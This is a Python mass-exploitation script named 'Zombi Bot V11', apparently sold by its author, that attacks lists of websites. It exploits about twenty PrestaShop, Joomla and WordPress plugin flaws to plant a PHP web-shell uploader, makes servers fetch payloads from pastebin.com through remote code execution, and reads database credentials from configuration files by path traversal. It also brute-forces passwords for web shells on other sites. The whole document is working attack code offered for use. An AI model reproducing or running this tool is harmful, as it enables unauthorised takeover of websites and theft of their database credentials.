#-*- coding: utf-8 -*-
from random import *
import string
import re
from McScrp import mcscrp
import os
import sys
import urllib2
from time import time as timer
import datetime
import mechanize
import time
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
try :
    import requests
except ImportError :
    print 'For Use The Bot , Install Requests And Urllib2 And colorama'
    exit (-1)
from multiprocessing.dummy import Pool
import random
from platform import system
from colorama import Fore
from colorama import Style
from colorama import init
requests.packages.urllib3.disable_warnings (InsecureRequestWarning)
init(autoreset=True)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

upload = 'files/xWarning.php'
up = """ <?php echo 'X-Warn!ng'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
shell_name = str (time.time ())[:-3]
filename = "xWarning" + shell_name + ".php"
name = "xWarning.php"

############ Viper 1337 Was Here ############
#Let's Start coding
date = datetime.datetime.now()

clear = "\x1b[0m"
colors = [36, 32, 34, 35, 31, 37]
siyass = """\n\n\n
                                                                                                         
"""
for N, line in enumerate(siyass.split("\n")):
    sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))

x = '\033[1;36m\033[0;m                                     \033[1;42m[ Zombi Bot V11 ][ Coded By Viper 1337 ]\033[0;m   \033[1;36m  \033[0;m'
y = "\033[1;36m\033[0;m                                             \033[1;42m[ Started At : %d" % (date.hour) +':%d' % (date.minute) + ':%d' % (date.second) + " ]\033[0;m   \033[1;36m  \033[0;m"
print(x)
print(y)
print("")

def cls():
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')




def exploits(url):
    try:
        if not 'http://' in url:
            url = 'http://' + url
        url = url.rstrip()
    #.1
        shell = url+'/modules/bamegamenu/ajax_phpcode.php?code=system("wget -O ../../xWarning.php https://pastebin.com/raw/EJj7BL5B");'
        index = url+'/modules/bamegamenu/ajax_phpcode.php?code=system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");'
        r = requests.get(shell)
        requests.get(index)
        pret = requests.get(url+'/xWarning.php')
        
        if 'X-Warning' in pret.content:
            
            shell = '/xWarning.php'
            index = '/xWarning.htm'
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Pretashop]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))
            print("")
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+shell)).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Index Uploaded] '.format(fg,sb)) + ('{}{}'+(url+index)).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
            print("")
            with open('Results/Shells.txt','a') as a:
                a.writelines(url+shell+'\n')
            file = open('Results/Index.txt','a')
            file.write(url+index+'\n')
            file.close()
        else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
      
    #.2
        pkup = {'file': open(upload, 'rb')}

        pkreq = requests.post(url + '/modules/pk_flexmenu/ajax/upload.php', files=pkup)

        pklib = requests.get(url + '/modules/pk_flexmenu/uploads/xWarning.php')

        if 'X-Warning' in pklib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Pretashop]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))            
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/modules/pk_flexmenu/uploads/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
            open('Results/UP.txt', 'a').write(url + '/modules/pk_flexmenu/uploads/xWarning.php' + '\n')
        else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
   #.3
        ok = requests.get(url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', timeout=3)

        if 'DB_USER' in ok.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Wordpress]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Config Grabber] '.format(fg,sb)) + ('{}{}'+(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
            open('Results/Config.txt', 'a').write(url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php' + '\n')
        else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))            
   #.4
        mamak = {'userfiles': open(upload, 'rb')}

        warn = requests.post(url + '/administrator/components/com_rokdownloads/assets/uploadhandler.php', files=mamak)

        warni = requests.get(url + '/images/stories/xWarning.php')

        if 'X-Warning' in warni.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/images/stories/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
            open('Results/UP.txt', 'a').write(url + '/images/stories/xWarning.php' + '\n')
        else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))            
  #.5
	appgravkg  = {"name" : "me.php", 
		      "drop_data" : "1", 
		      "overwrite" : "1",
		      "field_delimiter" : ",",
		      "text_delimiter" : "&quot;",
		      "option" : "com_fabrik",
		      "controller" :"import",
		      "view" : "import",
		      "task" : "doimport",
		      "Itemid" : "0", 
		      "tableid" : "0"}
		
		
	Gravkg = {'userfile':open(upload, 'rb')}
		
	Gravkgreq = requests.post(url+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data=appgravkg, files=Gravkg)
	
		
	Gravkglib = requests.get(url+'/media/xWarning.php')
		
		
	if 'X-Warning' in Gravkglib.content:
            
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/media/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/media/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))

  #.6
	zttappgravkg  = {'name':'Xwarning', 
		         'mail':'alasco54@yandex.ru', 
		         'catlist':'1',
		         'filetitle':"lolz",
		         'description':"<p>zot</p>",
		         '2d1a8f3bd0b5cf542e9312d74fc9766f':1,
		         'send':1,
		         'senden':"Send file",
		         'description':"<p>qsdqsdqsdqsdqsdqsdqsd</p>",
		         'option':"com_jdownloads", 
		         'view':"upload"}
		
		
	zttGravkg = {'pic_upload':(upload, open(upload, 'rb'), 'multipart/form-data')}
		
        zttGravkgreq = requests.post(url+'/index.php?option=com_jdownloads&Itemid=0&view=upload', data=zttappgravkg, files=zttGravkg)
	
		
	zttGravkglib = requests.get(url+'/images/jdownloads/screenshots/xWarning.php')
		
		
	if 'X-Warning' in zttGravkglib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/images/jdownloads/screenshots/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/'+'xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
  #.7
        aaReflexup = {'file' : open(upload, 'rb')}
        aaReflexreq = requests.post(url+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload', files=aaReflexup)
	aaReflexlib = requests.get(url+'/xWarning.php')
	if 'X-Warning' in aaReflexlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
  #.8
        aReflexup = {'files[]' : open(upload, 'rb')}
		
	aReflexreq = requests.post(url+'/components/com_jbcatalog/libraries/jsupload/server/php/', files=aReflexup)
		
	aReflexlib = requests.get(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/xWarning.php')
		
	if 'X-Warning' in aReflexlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
  #.9
        Reflexup = {'files[]' : open(upload, 'rb')}
		
	Reflexreq = requests.post(url+'/com_sexycontactform/fileupload/index.php', files=Reflexup)
		
	Reflexlib = requests.get(url+'/com_sexycontactform/fileupload/files/xWarning.php')
		
	if 'X-Warning' in Reflexlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/com_sexycontactform/fileupload/files/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/com_sexycontactform/fileupload/files/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.10
        cbGrav = {'Filedata': open(upload, 'rb')}
		
	cbGravreq = requests.post(url+'/modules/megamenu/uploadify/uploadify.php?folder=modules/megamenu/uploadify/"', files=cbGrav)
		
        cbGravlib = requests.get(url+'/modules/megamenu/uploadify/xWarning.php')
	if 'X-Warning' in cbGravlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/modules/megamenu/uploadify/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/modules/megamenu/uploadify/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
  #.11
	eReflexup = {'file' : open(upload, 'rb')}
		
	eReflexreq = requests.post(url+'/modules/mod_simplefileupload.3/elements/udd.php', files=eReflexup)
		
	eReflexlib = requests.get(url+'/modules/mod_simplefileupload.3/elements/xWarning.php')
		
		
	if 'X-Warning' in eReflexlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/modules/mod_simplefileupload.3/elements/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/modules/mod_simplefileupload.3/elements/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.12
	feReflexup = {'Filedata' : open(upload, 'rb')}
		
	feReflexreq = requests.post(url+'/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php', files=feReflexup)
		
	feReflexlib = requests.get(url+'/administrator/components/com_bt_portfolio/xWarning.php')
		
		
	if 'X-Warning' in feReflexlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/administrator/components/com_bt_portfolio/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/administrator/components/com_bt_portfolio/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.13
	zfeReflexup = {'file' : open(upload, 'rb')}
		
	zfeReflexreq = requests.post(url+'/index.php?option=com_jwallpapers&task=upload', files=zfeReflexup)
	
	zfeReflexlib = requests.get(url+'/jwallpapers_files/plupload/xWarning.php')
		
		
	if 'X-Warning' in zfeReflexlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Shell Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/jwallpapers_files/plupload/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/jwallpapers_files/plupload/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.14
        xdaCaaxcrevlib = requests.get(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php")
				
	if 'JConfig' in xdaCaaxcrevlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[JConfig] '.format(fg,sb)) + ('{}{}'+(url+'/index.php?option=com_cckjseblod&task=download&file=configuration.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/JConfig.txt', 'a').write(url+'/index.php?option=com_cckjseblod&task=download&file=configuration.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.15
	conflib = requests.get(url+"/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php")
				
	if 'DB_USER' in conflib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Config Grabber] '.format(fg,sb)) + ('{}{}'+(url+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Config.txt', 'a').write(url+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.16
    	confrlib = requests.get(url+"/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php")
				
	if 'DB_USER' in confrlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Joomla]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[Config Grabber] '.format(fg,sb)) + ('{}{}'+(url+'/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Config.txt', 'a').write(url+'/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.17

	Gravkg = {'Filedata':(name,up, 'text/html')}
		
	Gravkgreq = requests.post(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php', data=appgravkg, files=Gravkg)
		
	Gravkglib = requests.get(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/xWarning.php')
		
		
	if 'X-Warn!ng' in Gravkglib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [WordPress]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[UP Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
#.18

	appgrav  = {'field_id':'3',
		    'form_id':'1',
		    'gform_unique_id':'../../../../',
		     'name':'xWarning.phtml'}
		
		
	Grav = {'file':(name, up, 'text/html')}
		
	Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
	Gravlib = requests.get(url+'/wp-content/_input_3_xWarning.phtml')
		
		
	if 'X-Warn!ng' in Gravlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [WordPress]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[UP Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/wp-content/_input_3_xWarning.phtml')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/wp-content/_input_3_xWarning.phtml'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
 #.19


	pitchprintup = {'files[]':(name, up, 'text/html')}
		
	pitchprintreq = requests.post(url+'/wp-content/plugins/pitchprint/uploader/', files=pitchprintup)
		
	pitchprintlib = requests.get(url+'/wp-content/uploads/2018/03/xWarning.php')
		
		
	if 'X-Warn!ng' in pitchprintlib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [WordPress]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[UP Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/wp-content/uploads/2018/03/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/03/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))
#.20
	satoshiup = {'Filedata':(name, up, 'text/html')}
		
        satoshireq = requests.post(url+'/wp-content/themes/satoshi/functions/upload-handler.php', files=satoshiup)
		
	satoshilib = requests.get(url+'/wp-content/uploads/2018/03/xWarning.php')
		
		
	if 'X-Warn!ng' in satoshilib.content:
            print ('{}{}['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [WordPress]'.format(fw,sb)) + ('{}{} [Vuln]'.format(fg,sb))                        
            print ('{}{}\t\t['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn)) + ('{}{}[UP Uploaded] '.format(fg,sb)) + ('{}{}'+(url+'/wp-content/uploads/2018/03/xWarning.php')).format(fy,sb) + ('{}{} ['.format(fc,sn)) + ('{}{}+'.format(fr,sn)) + ('{}{}] '.format(fc,sn))
	    open('Results/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/03/xWarning.php'+'\n')
	else:
            print ('{}{}['.format(fc,sn)) + ('{}{}-'.format(fr,sn)) + ('{}{}] '.format(fc,sn))+('{}{}'+(url)).format(fy,sb) + ('{}{} [Not Vuln]'.format(fr,sb))		








			


                                                                                                              



    except:
        pass

def exploitsrun():
    try:
        
        warning = raw_input("{}{}\n\t[-] Put Your List Sites Vuln => ".format(fy,sb))
        warning = open(warning,'r').readlines()
        print("")
        cls()
        print('{}{}'+(siyass)).format(fg,sb) + '\t\t    [ New Exploits , Zombi Bot v11 Only For Sell By Viper 1337 ]'
        print("{}{}\n\t\t\t\t[ Zombi Bot V11 Is Preparing To Exploiting... ]".format(fy,sb))
        print("")
        ThreadPool = Pool(15)
        Threads = ThreadPool.map(exploits, warning)
    except:
        pass



def shell():
    url = raw_input('{}{}\n\t\t\t\t[*] Enter The URL OF The Shell : exp(www.target.com/shell.php) : '.format(fy, sb))
    passw = raw_input('{}{}\n\t\t[*] Enter The WordList Of P@ssw0rds : '.format(fy, sb))
    cls()
    print('{}{}' + siyass+'\n\t\t\t\t[ BruteForce Shell Password By Viper 1337 ]').format(fg,sb)
    f = open(passw, 'r').readlines()
    if (len(f) > 0):
        for s in f:
            passs = s.rstrip()
            shell2(url, passs)


def shell2(site, password):
    print("")
    print "{}{}\t\t[*] Trying ==> ".format(fw, sb) + ('{}{}' + (password)).format(fc, sb)
    data = {
        "pass": password,
    }
    r = requests.post(site, data=data)
    html = r.text
    if 'Linux' in html:
        print("{}{}\n\t[+] Done !! Password Found Succesfully // P@ssw0rd ==> ".format(fg, sb)) + ("{}{}" + (password)).format(fc, sb)
        f = open('Result-BruteForce/Shell.txt', 'a')
        f.write('Done !! Password Found // Shell Url : ' + site + ' Password Of Shell ==> ' + password)
        f.write('\n')
        f.close()
        print("")
